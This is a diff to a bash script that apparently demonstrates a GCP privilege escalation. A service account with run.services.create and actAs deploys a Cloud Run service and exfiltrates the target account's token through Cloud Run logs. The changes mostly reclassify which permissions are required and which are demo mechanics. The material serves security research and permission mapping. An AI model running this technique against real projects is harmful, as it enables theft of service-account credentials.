@@ -36,18 +36,20 @@
 #     minted as starting_sa instead (run.routes.invoke — run.services.invoke
 #     is not a real GCP IAM permission). Verified permission classification
 #     (2026-11-01 leave-one-out isolation run, both modes green):
-#       run.services.get and logging.logEntries.list are REQUIRED even with
-#       the raw API (URL extraction + LRO polling + the logs exfil channel) —
-#       they live in the cr_deploy_req role, not the helpful role.
+#       run.services.create + run.operations.get (LRO polling) + actAs are the
+#       required technique (cr_deploy_req role). run.services.get and
+#       logging.logEntries.list are DEMO-PAYLOAD MECHANICS (this demo's URL
+#       discovery and its read-back of the exfiltrated token from Cloud Run
+#       logs) — not the core technique; they live in the cr_deploy_help role.
 #       The only gcloud-mechanic helpful permission is run.services.update
 #       (re-deploying to the service name left by a prior run takes the
 #       update path; a fresh deploy never needs it).
 #
 #   --api-only: uses the raw Cloud Run v2 REST API via curl. Requires only the
-#     verified raw-API minimum: run.services.create + actAs + run.services.get
-#     (fetch the service URL via urls[]) + run.operations.get (poll the async
-#     LRO) + logging.logEntries.list (read the exfiltrated token from the
-#     logs). Demonstrates the exact minimal permission surface of the attack.
+#     technique minimum: run.services.create + actAs + run.operations.get (poll
+#     the async LRO). This demo additionally uses the helpful demo-payload
+#     mechanics run.services.get (fetch the service URL via urls[]) and
+#     logging.logEntries.list (read the exfiltrated token from the logs).
 #
 # Re-running / switching modes: both modes use the same deterministic
 # SERVICE_NAME. gcloud mode re-deploys in place (its helpful run.services.update
@@ -369,9 +371,8 @@ if $USE_GCLOUD; then
         tail -10 "$DEPLOY_STDERR_FILE"
         echo ""
         echo "Check that starting_sa holds iam.serviceAccounts.actAs on target_sa and"
-        echo "run.services.create (plus run.services.get, run.operations.get and"
-        echo "logging.logEntries.list, all verified required even with the raw API) on"
-        echo "the project."
+        echo "run.services.create (plus run.operations.get; this demo also uses the"
+        echo "helpful run.services.get and logging.logEntries.list) on the project."
         echo ""
         echo "Tip: run with --api-only to use the raw REST API, which needs fewer permissions"
         rm -f "$DEPLOY_STDERR_FILE"
@@ -481,8 +482,8 @@ else
     done
     SERVICE_DEPLOYED=true
 
-    # (c) Fetch the service URL (run.services.get — candidate required even
-    # with the raw API; the isolator will confirm).
+    # (c) Fetch the service URL (run.services.get — helpful demo mechanic,
+    # not part of the core technique).
     show_cmd "$STARTING_SA_EMAIL" \
         "curl -s -H 'Authorization: Bearer <redacted>' 'https://run.googleapis.com/v2/projects/$PROJECT_ID/locations/$REGION/services/$SERVICE_NAME' (run.services.get)"
     SERVICE_JSON=$(curl -s \
@@ -540,8 +541,8 @@ echo ""
 # Step 5: [EXPLOIT] Read the exfiltrated token from the Cloud Run logs
 # (exfil-mode logs). Poll for up to ~3 minutes: the cold start triggered by
 # step 4 may take a few seconds, and Cloud Logging lags slightly behind
-# container stdout. Requires logging.logEntries.list (granted in the required
-# role) — same channel gcpwn uses for --exfil-mode logs.
+# container stdout. Uses logging.logEntries.list (a helpful demo mechanic
+# granted in the helpful role) — same channel gcpwn uses for --exfil-mode logs.
 echo -e "${YELLOW}Step 5: [EXPLOIT] Exfiltrating target SA token from Cloud Run logs${NC}"
 
 EXFILTRATED_TOKEN=""
@@ -728,10 +729,12 @@ if $USE_GCLOUD; then
     echo "  (2026-11-01 leave-one-out isolation run, both modes green):"
     echo ""
     echo "  Required even with the raw API (cr_deploy_req role):"
-    echo "    run.services.get       — fetch the service URL and readiness polling"
     echo "    run.operations.get     — poll the async deploy LRO"
-    echo "    logging.logEntries.list — reading the exfiltrated token from Cloud Run"
-    echo "                            logs (gcloud logging read)"
+    echo ""
+    echo "  Demo-payload mechanics (cr_deploy_help role, not the core technique):"
+    echo "    run.services.get       — this demo's service URL discovery / readiness polling"
+    echo "    logging.logEntries.list — this demo's read-back of the exfiltrated token"
+    echo "                            from Cloud Run logs (gcloud logging read)"
     echo ""
     echo "  gcloud-only mechanic (cr_deploy_help role, not part of the vulnerability):"
     echo "    run.services.update   — only needed when gcloud re-deploys to the service"
